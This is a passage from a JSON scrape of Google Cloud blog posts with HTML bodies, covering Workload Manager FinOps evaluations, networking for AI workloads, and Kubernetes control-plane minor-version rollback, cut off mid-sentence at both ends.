repository</span></a><span style=\"vertical-align: baseline;\">). In our example we will use one of the predefined \u2018Google Cloud Best Practices\u2019 rules for bigquery-missing-labels on a dataset. In this case, navigate to the Workload Manager section in your Google Cloud Console and start by creating a new evaluation.</span></p>\n<p><span style=\"vertical-align: baseline;\">Give your evaluation a name and select \"Custom\" as the workload type. This is where you can point Workload Manager to the Cloud Storage bucket that contains your custom FinOps rules if you\u2019ve built one. The experience allows you to run both pre-defined and custom rule checks in one evaluation.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Figure - 2\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/Figure_-_2.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 2 - Creating new evaluation rule</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><strong style=\"vertical-align: baseline;\">Step 2: Define the scope of your scan</strong></p>\n<p><span style=\"vertical-align: baseline;\">Next, define the scope of your evaluation. You have the flexibility to scan your entire Google Cloud organization, specific folders, or individual projects. This allows you to apply broad cost-governance policies organization-wide, or create more targeted rules for specific teams or environments. You can also apply filters based on resource labels or names for more granular control. In this example, region selection lets you select where you want to process your data to meet data residency requirements.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Figure - 3\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/Figure_-_3.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 3 - Selecting scope and location for your evaluation rule</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><strong style=\"vertical-align: baseline;\">Step 3: Schedule and notify</strong></p>\n<p><span style=\"vertical-align: baseline;\">With FinOps, automation is key. You can schedule your evaluation to run at a specific cadence, from hourly to monthly. This helps ensure continuous monitoring and provides a historical record of your policy compliance. Optionally, but highly recommended for FinOps, you can configure the evaluation to save all results to a BigQuery dataset for historical analysis and reporting.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">You can also set up notifications to alert the right teams when an issue is found. Channels include email, Slack, PagerDuty, and more, so that policy violations can be addressed promptly.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"figure - 4\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/figure_-_4.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 4 - Export, schedule and notify evaluation rules</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><strong style=\"vertical-align: baseline;\">Step 4: Run, review, and report</strong></p>\n<p><span style=\"vertical-align: baseline;\">Once saved, the evaluation will run on your defined schedule, or you can trigger it on-demand. The results of each scan are stored, providing a historical view of your compliance posture</span></p>\n<p><span style=\"vertical-align: baseline;\">From the Workload Manager dashboard, you can see a summary of scanned resources, issues found, and trends over time. For deeper analysis, you can explore the violation data directly in the BigQuery dataset you configured earlier.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"figure - 5\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/figure_-_5.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure - 5: Checkout evaluations for workload manager</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">Visualize findings with Looker Studio</strong></h3>\n<p><span style=\"vertical-align: baseline;\">To make the data accessible and actionable for all stakeholders, you can easily connect your BigQuery results to Looker Studio. Create interactive dashboards that visualize your FinOps policy violations, such as assets missing required labels or resources that don't comply with cost-saving rules. This provides a clear, at-a-glance view of your cost governance status.</span></p>\n<p><span style=\"vertical-align: baseline;\">You can find Looker Studio template in template gallery and easily connect it with your datasets and modify as needed. Here is how you can use it:</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Go to Looker studio.\u00a0</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Navigate to Templates and under Bigquery, select </span><a href=\"https://lookerstudio.google.com/c/reporting/e146051d-f7fd-406c-a62c-290fa2fee749/preview/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Cloud Workload Manager</span></a></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Click on \u201cUse your own Data\u201d that asks for connecting the Bigquery table generated in previous steps.\u00a0</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">After you have connected the Bigquery dataset,\u00a0 lick on Edit to create a customizable copy to incorporate any changes or share it with your team. </span></p>\n</li>\n</ol></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"figure 6\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/figure_6_rqgAwFk.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure - 6: Set up preconfigured Looker Studio dashboard for reporting</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">Take control of your cloud costs today</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Stop the endless cycle of manual cloud cost management. With Workload Manager, you can embed your FinOps policies directly into your cloud environment, automate enforcement, and provide teams with the feedback they need to stay on budget.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">Ready to get started? Explore the </span><a href=\"https://github.com/GoogleCloudPlatform/workload-manager\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">sample policies on GitHub</span></a><span style=\"vertical-align: baseline;\"> and check out the </span><a href=\"https://cloud.google.com/workload-manager/docs/evaluate/custom-rules/about-custom-rules\"><span style=\"text-decoration: underline; vertical-align: baseline;\">official documentation</span></a><span style=\"vertical-align: baseline;\"> to begin automating your FinOps framework today, and take advantage of Workload Manager\u2019s new pricing.</span></p>\n<p><span style=\"vertical-align: baseline;\">Check out a quick overview video on how Workload Manager Evaluations helps you do a lot more across Security, Reliability and FinOps.</span></p></div>\n<div class=\"block-video\">\n\n\n\n<div class=\"article-module article-video \">\n  <figure>\n    <a class=\"h-c-video h-c-video--marquee\" href=\"https://youtube.com/watch?v=sWwvdkLyA6A\">\n\n      \n        \n\n        <div class=\"article-video__aspect-image\">\n          <span class=\"h-u-visually-hidden\">Google Cloud Configuration Management with Workload Manager</span>\n        </div>\n      \n      <svg class=\"h-c-video__play h-c-icon h-c-icon--color-white\" xmlns=\"http://www.w3.org/2000/svg\">\n        <use xlink:href=\"#mi-youtube-icon\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"></use>\n      </svg>\n    </a>\n\n    \n  </figure>\n</div>\n\n<div class=\"h-c-modal--video\">\n   <a class=\"glue-yt-video\" href=\"https://youtube.com/watch?v=sWwvdkLyA6A\">\n   </a>\n</div>\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Then, review the updated </span><a href=\"https://cloud.google.com/workload-manager/pricing\"><span style=\"text-decoration: underline; vertical-align: baseline;\">pricing</span></a><span style=\"vertical-align: baseline;\"> to learn more.</span></p></div>",
        "published_date": "2025-11-04 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/networking/how-google-cloud-networking-supports-your-ai-workloads/",
        "title": "7 ways networking powers your AI workloads on Google Cloud",
        "thumbnail": "https://storage.googleapis.com/gweb-cloudblog-publish/images/0-way-ai-hero.max-600x600.png",
        "author": "Ammett Williams",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">When we talk about artificial intelligence (AI), we often focus on the models, the powerful TPUs and GPUs, and the massive datasets. But behind the scenes, there's an unsung hero making it all possible: </span><strong style=\"vertical-align: baseline;\">networking</strong><span style=\"vertical-align: baseline;\">. While it's often abstracted away, networking is the crucial connective tissue that enables your AI workloads to function efficiently, securely, and at scale.</span></p>\n<p><span style=\"vertical-align: baseline;\">In this post, we explore seven key ways networking interacts with your AI workloads on Google Cloud, from accessing public APIs to enabling next-generation, AI-driven network operations.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">#1 - Securely accessing AI APIs</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Many of the powerful AI models available today, like Gemini on Vertex AI, are accessed via public APIs. When you make a call to an endpoint like </span><code style=\"vertical-align: baseline;\">*-aiplatform.googleapis.com</code><span style=\"vertical-align: baseline;\">, you're dependent on a reliable network connection. To gain access these endpoints require proper authentication. This ensures that only authorized users and applications can access these powerful models, helping to safeguard your data and your AI investments. You can also access these endpoints privately, which we will see in more detail in point # 5.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">#2 - Exposing models for inference</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Once you've trained or tuned your model, you need to make it </span><a href=\"https://cloud.google.com/vertex-ai/docs/general/deployment\"><span style=\"text-decoration: underline; vertical-align: baseline;\">available for inference</span></a><span style=\"vertical-align: baseline;\">. In addition to managed offerings in Google Cloud, you also have the flexibility to deploy your models on infrastructure you control, using specialized </span><a href=\"https://cloud.google.com/compute/docs/gpus#gpu-models\"><span style=\"text-decoration: underline; vertical-align: baseline;\">VM families with powerful GPUs</span></a><span style=\"vertical-align: baseline;\">. For example, you can deploy your model on </span><a href=\"https://cloud.google.com/kubernetes-engine/docs/concepts/kubernetes-engine-overview\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Kubernetes Engine (GKE)</span></a><span style=\"vertical-align: baseline;\"> and use the </span><a href=\"https://cloud.google.com/kubernetes-engine/docs/concepts/about-gke-inference-gateway\"><span style=\"text-decoration: underline; vertical-align: baseline;\">GKE Inference Gateway</span></a><span style=\"vertical-align: baseline;\">, Cloud Load Balancing, or a ClusterIP to expose it for private or public inference. These networking components act as the entry point for your applications, allowing them to interact with your model deployments seamlessly and reliably.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">#3 - High-speed GPU-to-GPU communication</strong></h3>\n<p><span style=\"vertical-align: baseline;\">AI workloads, especially training, involve moving massive amounts of data between GPUs. Traditional networking, which relies on CPU copy operations, can create bottlenecks. This is where protocols like </span><strong style=\"vertical-align: baseline;\">Remote Direct Memory Access</strong><span style=\"vertical-align: baseline;\"> (</span><strong style=\"vertical-align: baseline;\">RDMA) </strong><span style=\"vertical-align: baseline;\">come in. RDMA bypasses the CPU, allowing for direct memory-to-memory communication between GPUs.</span></p>\n<p><span style=\"vertical-align: baseline;\">To support this, the underlying network must be lossless and high-performance. Google has built out a </span><a href=\"https://cloud.google.com/compute/docs/gpus/gpu-network-bandwidth#h200-gpus\"><span style=\"text-decoration: underline; vertical-align: baseline;\">non-blocking rail-aligned network topology</span></a><span style=\"vertical-align: baseline;\"> in its data center architecture to support RDMA communication and node scaling. Several high-performance GPU VM families support </span><a href=\"https://cloud.google.com/vpc/docs/network-profiles#about_network_profiles\"><span style=\"text-decoration: underline; vertical-align: baseline;\">RDMA over Converged Ethernet (RoCEv2)</span></a><span style=\"vertical-align: baseline;\">, providing the speed and efficiency needed for demanding AI workloads.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">#4 - Data ingestion and storage connectivity</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Your AI models are only as good as the data they're trained on. This data needs to be stored, accessed, and retrieved efficiently. Google Cloud offers a variety of storage options, for example </span><a href=\"https://cloud.google.com/architecture/ai-ml/storage-for-ai-ml#review-storage-options\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Cloud Storage</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://cloud.google.com/architecture/ai-ml/storage-for-ai-ml#review-storage-options\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Hyperdisk ML</span></a><span style=\"vertical-align: baseline;\"> and </span><a href=\"https://cloud.google.com/architecture/ai-ml/storage-for-ai-ml#review-storage-options\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Managed Lustre</span></a><span style=\"vertical-align: baseline;\">. Networking is what connects your compute resources to your data. Whether you're accessing data directly or over the network, having a high-throughput, low-latency connection to your storage is essential for keeping your AI pipeline running smoothly.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">#5 - Private connectivity to AI workloads</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Security is paramount, and you often need to ensure that your AI workloads are not exposed to the public internet. Google Cloud provides several ways to achieve private communication to both managed Vertex AI services and your own DIY AI deployments. These include:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://cloud.google.com/vpc-service-controls/docs/overview\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">VPC Service Controls</strong></a><strong style=\"vertical-align: baseline;\">:</strong><span style=\"vertical-align: baseline;\"> Creates a service perimeter to prevent data exfiltration.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://cloud.google.com/vpc/docs/private-service-connect\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Private Service Connect</strong></a><strong style=\"vertical-align: baseline;\">:</strong><span style=\"vertical-align: baseline;\"> Allows you to access Google APIs and managed services privately from your VPC. You can use PSC endpoints to connect to your own services or Google services.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://cloud.google.com/dns/docs/best-practices\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Cloud DNS</strong></a><strong style=\"vertical-align: baseline;\">:</strong><span style=\"vertical-align: baseline;\"> </span><a href=\"https://cloud.google.com/vpc/docs/configure-private-service-connect-services#configure-dns-manual\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Private DNS zones</span></a><span style=\"vertical-align: baseline;\"> can be used to resolve internal IP addresses for your AI services.</span></p>\n</li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">#6 - Bridging the gap with hybrid cloud connections</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Many enterprises have a hybrid cloud strategy, with sensitive data remaining on-premises. The Cross-Cloud Network allows you to architect your network to provide any-to-any connectivity. With design cases covering </span><a href=\"https://cloud.google.com/architecture/ccn-distributed-apps-design\"><span style=\"text-decoration: underline; vertical-align: baseline;\">distributed applications</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://services.google.com/fh/files/misc/global_front_end_solution_deep_dive.pdf\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Global front end</span></a><span style=\"vertical-align: baseline;\">, and </span><a href=\"https://services.google.com/fh/files/misc/cloud_wan_solution_overview.pdf\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Cloud WAN</span></a><span style=\"vertical-align: baseline;\">, you can build your architecture securely from on-premises, other clouds or other VPCs to connect to your AI workloads. This hybrid connectivity allows you to leverage the scalability of Google Cloud's AI services while keeping your data secured.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">#7 - The Future: AI-driven network operations</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The relationship between AI and networking is becoming a two-way street. With </span><a href=\"https://cloud.google.com/gemini/docs/overview\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Gemini for Google Cloud</strong></a><span style=\"vertical-align: baseline;\">, network engineers can now use natural language to design, optimize, and troubleshoot their network architectures. This is the first step towards what we call \"agentic networking,\" where autonomous AI agents can proactively detect, diagnose, and even mitigate network issues. This transforms network engineering from a reactive discipline to a predictive and proactive one, ensuring your network is always optimized for your AI workloads.</span></p></div>\n<div class=\"block-video\">\n\n\n\n<div class=\"article-module article-video \">\n  <figure>\n    <a class=\"h-c-video h-c-video--marquee\" href=\"https://youtube.com/watch?v=mNjysmJNmlw\">\n\n      \n        \n\n        <div class=\"article-video__aspect-image\">\n          <span class=\"h-u-visually-hidden\">Google&#x27;s global network demo: fast incident response with autonomous network operations</span>\n        </div>\n      \n      <svg class=\"h-c-video__play h-c-icon h-c-icon--color-white\" xmlns=\"http://www.w3.org/2000/svg\">\n        <use xlink:href=\"#mi-youtube-icon\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"></use>\n      </svg>\n    </a>\n\n    \n  </figure>\n</div>\n\n<div class=\"h-c-modal--video\">\n   <a class=\"glue-yt-video\" href=\"https://youtube.com/watch?v=mNjysmJNmlw\">\n   </a>\n</div>\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">Learn more</strong><span style=\"vertical-align: baseline;\">\u00a0</span></h3>\n<p><span style=\"vertical-align: baseline;\">To learn more about networking and AI on Google Cloud dive deeper with the following:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Documentation: </span><a href=\"https://cloud.google.com/ai-hypercomputer/docs/create/create-overview\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AI Hypercomputer</span></a></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Codelabs: </span><a href=\"https://codelabs.developers.google.com/codelabs/terraform-gemini-cli-gce-psc\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Gemini CLI on GCE with a Private Service Connect endpoint</span></a></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">White paper: </span><a href=\"https://cloud.google.com/resources/content/autonomous-network-operations?hl=en\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Leveling up with Autonomous Network Operations</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Want to ask a question, find out more or share a thought? Please connect with me on </span><a href=\"https://www.linkedin.com/in/ammett/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Linkedin</span></a><span style=\"vertical-align: baseline;\">.</span></p></div>\n<div class=\"block-related_article_tout\">\n\n\n\n\n\n<div class=\"uni-related-article-tout h-c-page\">\n  <section class=\"h-c-grid\">\n    <a class=\"uni-related-article-tout__wrapper h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n        h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3 uni-click-tracker\" href=\"https://cloud.google.com/blog/products/networking/google-global-network-technology-deep-dive/\">\n      <div class=\"uni-related-article-tout__inner-wrapper\">\n        <p class=\"uni-related-article-tout__eyebrow h-c-eyebrow\">Related Article</p>\n\n        <div class=\"uni-related-article-tout__content-wrapper\">\n          <div class=\"uni-related-article-tout__image-wrapper\">\n            <div class=\"uni-related-article-tout__image\"></div>\n          </div>\n          <div class=\"uni-related-article-tout__content\">\n            <h4 class=\"uni-related-article-tout__header h-has-bottom-margin\">Diving into the technology behind Google&#x27;s AI-era global network</h4>\n            <p class=\"uni-related-article-tout__body\">Google global network\u2019s technology innovations to meet the demands of the AI era.</p>\n            <div class=\"cta module-cta h-c-copy  uni-related-article-tout__cta muted\">\n              <span class=\"nowrap\">Read Article\n                <svg class=\"icon h-c-icon\" xmlns=\"http://www.w3.org/2000/svg\">\n                  <use xlink:href=\"#mi-arrow-forward\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"></use>\n                </svg>\n              </span>\n            </div>\n          </div>\n        </div>\n      </div>\n    </a>\n  </section>\n</div>\n\n</div>",
        "published_date": "2025-11-04 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/containers-kubernetes/kubernetes-gets-minor-version-rollback/",
        "title": "Upgrading Kubernetes versions just got safer with minor version rollback",
        "thumbnail": null,
        "author": "Wenjia Zhang",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Upgrading a Kubernetes cluster has always been a one-way street: you move forward, and if the control plane has an issue, your only option is to roll forward with a fix. This adds significant risk to routine maintenance, a problem made worse as organizations upgrade more frequently for new AI features while demanding maximum reliability. Today, in partnership with the Kubernetes community, we are introducing a new capability in Kubernetes 1.33 that solves this: Kubernetes control-plane minor-version rollback. For the first time, you have a reliable path to revert a control-plane upgrade, fundamentally changing cluster lifecycle management.</span><span style=\"text-decoration: line-through; vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">This feature is available in open-source Kubernetes, and is integrated and generally available in Google Kubernetes Engine starting in GKE 1.33 soon.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">The challenge: Why were rollbacks so hard?</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Kubernetes' control plane components, especially kube-apiserver and etcd, are stateful and highly sensitive to API version changes. When you upgrade, many new APIs and features are introduced in the new binary. Some data might be migrated to new formats and API versions. Downgrading was unsupported because there was no mechanism to safely revert changes, risking data corruption and complete cluster failure.</span></p>\n<p><span style=\"vertical-align: baseline;\">As a simple example, consider adding a new field to an existing resource. Until now, both the storage and API progressed in a single step, allowing clients to write data to that new field immediately. If a regression was detected, rolling back removed access to that field, but the data written to it would not be garbage-collected. Instead, it would persist silently in etcd. This left the administrator in an impossible situation. Worse, upon a future re-upgrade to that minor version, this stale \"garbage\" data could suddenly become \"alive\" again, introducing potentially problematic and indeterministic behavior.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">The solution: Emulated versions</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The Kubernetes Enhancement Proposal (KEP), </span><a href=\"https://github.com/kubernetes/enhancements/tree/master/keps/sig-architecture/4330-compatibility-versions\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">KEP-4330: Compatibility Versions</span></a><span style=\"vertical-align: baseline;\">, introduces the concept of an \"emulated version\" for the control plane. Contributed by Googlers, this creates a new two-step upgrade process:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Step 1: Upgrade binaries. </strong><span style=\"vertical-align: baseline;\">You upgrade the control plane binary, but the \"emulated version\" stays the same as the pre-upgrade version. At this stage, all APIs, features, and storage data formats remain unchanged. This makes it safe to roll back your control plane to the previously stable version if you find a problem.</span></p>\n</li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Validate health and check for regressions.</strong><span style=\"vertical-align: baseline;\"> The 1st step creates a safe validation window during which you can verify that it's safe to proceed \u2014 for example, making sure your own components or workloads are running healthy under the new binaries and checking for any performance regressions before committing to the new API versions.</span></p>\n</li>\n</ul>\n<li><strong style=\"vertical-align: baseline;\">Step 2:</strong><span style=\"vertical-align: baseline;\"> </span><strong style=\"vertical-align: baseline;\">Finalize upgrade.</strong><span style=\"vertical-align: baseline;\"> After you complete your testing, you \"bump\" the emulated version to the new version. This enables all the new APIs and features of the latest Kubernetes release and completes the upgrade.</span></li>\n</ul></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"image1\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/image1_dq2nDBb.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">This two-step process gives you granular control, more observability, and a safe window for rollbacks. If an upgrade has an unexpected issue, you no longer need to scramble to roll forward. You now have a reliable way to revert to a known-good state, stabilize your cluster, and plan your next move calmly. This is all backed by comprehensive testing for the two-step upgrade in both open-source Kubernetes and GKE.</span></p>\n<p><span style=\"vertical-align: baseline;\">Enabling this was a major effort, and we want to thank all the Kubernetes contributors and feature owners whose collective work to test, comply, and adapt their features made this advanced capability a reality.</span></p>\n<p><span style=\"vertical-align: baseline;\">This feature, coming soon to GKE 1.33, gives you a new tool to de-risk upgrades and dramatically shorten recovery time from unforeseen complications.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">A better upgrade experience in OSS Kubernetes</strong></h3>\n<p><span style=\"vertical-align: baseline;\">This rollback capability is just one part of our broader, long-term investment in improving the Kubernetes upgrade experience for the entire community. At Google, we\u2019ve been working upstream on several other critical enhancements to make cluster operations smoother, safer, and more automated. Here are just a few examples:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Support for skip-version upgrades:</strong><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">Our work on KEP-4330 also makes it possible to enable \"skip-level\" upgrades for Kubernetes. This means that instead of having to upgrade sequentially through every minor version (e.g., v1.33 to v1.34 to v1.35), you will be able to upgrade directly from an older version to a newer one, potentially skipping one or more intermediate releases (e.g., v1.33 to v1.35). This aims to reduce the complexity and downtime associated with major upgrades, making the process more efficient and less disruptive for cluster operators.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Coordinated Leader Election (KEP-4355):</strong><span style=\"vertical-align: baseline;\"> This effort ensures that different control plane components (like kube-controller-manager and kube-scheduler) can gracefully handle leadership changes during an upgrade, so that the Kubernetes version skew policy is not violated.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Graceful Leader Transition (KEP-5366):</strong><span style=\"vertical-align: baseline;\"> Building on the above, this allows a leader to cleanly hand off its position before shutting down for an upgrade, enabling zero-downtime transitions for control plane components.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Mixed Version Proxy (KEP-4020):</strong><span style=\"vertical-align: baseline;\"> This feature improves API server reliability in mixed-version clusters (like during an upgrade). It prevents false \"NotFound\" errors by intelligently routing resource requests to a server that recognizes the resource. It also ensures discovery provides a complete list of all resources from all servers in a mixed-version cluster.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Component Health SLIs for Upgrades (KEP-3466):</strong><span style=\"vertical-align: baseline;\"> To upgrade safely, you need to know if the cluster is healthy. This KEP defines standardized Service Level Indicators (SLIs) for core Kubernetes components. This provides a clear, data-driven signal that can be used for automated upgrade canary analysis, stopping a bad rollout before it impacts the entire cluster.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Together, these features represent a major step forward in the maturity of Kubernetes cluster lifecycle management. We are incredibly proud to contribute this work to the open-source community and to bring these powerful capabilities to our GKE customers.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Learn more at KubeCon</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Want to learn more about the open-source feature and how it's changing upgrades? Come say hi to </span><a href=\"https://rsvp.withgoogle.com/events/google-cloud-at-kubecon-north-america-2025\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">our team at KubeCon</span></a><span style=\"vertical-align: baseline;\">! You can find us at booths #200 and #1100 and at a variety of sessions, including:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://sched.co/27dCm\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Accelerating Innovation: The Evolution of Kubernetes and the Road Ahead</span></a><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">with Jago Macleod (Google)</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://sched.co/27FXC\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Upgrade Nightmare To Uptime Dream: The Cloud Provider's Playbook for Critical Kubernetes Work</span><span style=\"vertical-align: baseline;\"> with </span></a><span style=\"vertical-align: baseline;\">Yuchen Zhou (Google) &amp; Uttam Kumar (Salesforce).</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://sched.co/28aCs\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Navigating the Multi-Version Kubernetes Universe: How Emulation Version Shapes Your Contributions</span></a><span 